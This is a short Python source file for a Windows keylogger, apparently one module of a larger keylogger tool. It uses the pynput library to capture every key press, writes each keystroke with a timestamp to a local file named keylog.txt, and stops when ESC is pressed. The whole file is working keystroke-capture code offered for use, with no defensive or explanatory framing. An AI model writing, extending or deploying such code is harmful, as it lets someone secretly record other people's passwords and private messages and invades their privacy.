# Save this in keylogger_tool/windows/windows_keylogger.py
from pynput import keyboard
import logging

# Set up logging for keylogger
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Exit keylogger on pressing ESC
        return False

def create_windows_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Windows Keylogger created.")
